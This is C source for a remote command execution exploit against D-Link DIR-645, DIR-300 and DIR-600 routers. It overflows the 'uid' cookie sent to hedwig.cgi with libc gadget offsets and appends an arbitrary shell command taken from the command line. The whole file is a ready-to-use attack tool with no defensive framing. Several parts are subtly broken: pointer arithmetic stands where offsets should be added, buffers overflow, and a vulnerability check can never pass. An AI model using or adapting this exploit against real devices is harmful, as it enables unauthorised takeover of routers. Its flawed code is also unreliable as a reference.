// D-Link DIR-645 Ver. 1.03, D-Link DIR-300 Ver. 2.14, D-Link DIR-600

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_RESPONSE_SIZE 8192
#define TARGET_PORT 80

void random_string(char *str, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < length; i++) {
        str[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    str[length] = '\0';
}

// Function to create an HTTP POST request
void create_http_post_request(const char *target_ip, const char *path, const char *cookie, const char *data, char *request, size_t request_size) {
    snprintf(request, request_size,
             "POST %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Cookie: %s\r\n"
             "Content-Length: %lu\r\n"
             "Connection: close\r\n\r\n"
             "%s",
             path, target_ip, cookie, strlen(data), data);
}

// Function to send an HTTP POST request
int send_http_post_request(const char *target_ip, const char *path, const char *cookie, const char *data) {
    int sock;
    struct sockaddr_in server_addr;
    char request[2048];
    char response[MAX_RESPONSE_SIZE];
    int bytes_received;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    create_http_post_request(target_ip, path, cookie, data, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    memset(response, 0, sizeof(response));
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

// Function to execute a command
char *execute_command(const char *target_ip, const char *cmd) {
    char shellcode[1024];
    char cookie[2048];
    char data[256];
    const unsigned int libcbase = 0x2aaf8000;
    const unsigned int system_offset = 0x000531FF;
    const unsigned int calcsystem_offset = 0x000158C8;
    const unsigned int callsystem_offset = 0x000159CC;

    // Generate random shellcode
    random_string(shellcode, 973);
    memcpy(shellcode + 973, &libcbase + system_offset, sizeof(unsigned int));
    random_string(shellcode + 977, 16);
    memcpy(shellcode + 993, &libcbase + callsystem_offset, sizeof(unsigned int));
    random_string(shellcode + 997, 12);
    memcpy(shellcode + 1009, &libcbase + calcsystem_offset, sizeof(unsigned int));
    random_string(shellcode + 1013, 16);
    strcat(shellcode, cmd); // Append the command

    snprintf(cookie, sizeof(cookie), "uid=%s;", shellcode);
    snprintf(data, sizeof(data), "key=%s", shellcode); // Random key-value pair

    // Send the HTTP POST request
    send_http_post_request(target_ip, "/hedwig.cgi", cookie, data);
    return NULL; // No response handling for this example
}

// Function to check vulnerability
int check_vulnerability(const char *target_ip) {
    char fingerprint[11];
    random_string(fingerprint, 10);
    fingerprint[10] = '\0'; // Null-terminate

    char cmd[50];
    snprintf(cmd, sizeof(cmd), "echo %s", fingerprint);

    char *response = execute_command(target_ip, cmd);
    if (response && strstr(response, fingerprint)) {
        return 1; // Target is vulnerable
    }

    return 0; // Target is not vulnerable
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <command>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1]; // Target IP from command line argument
    const char *cmd = argv[2]; // Command to execute from command line argument

    if (check_vulnerability(target_ip)) { // Check if the target is vulnerable
        execute_command(target_ip, cmd); // Execute the command
        printf("Command executed successfully.\n");
    }

    return EXIT_SUCCESS;
}
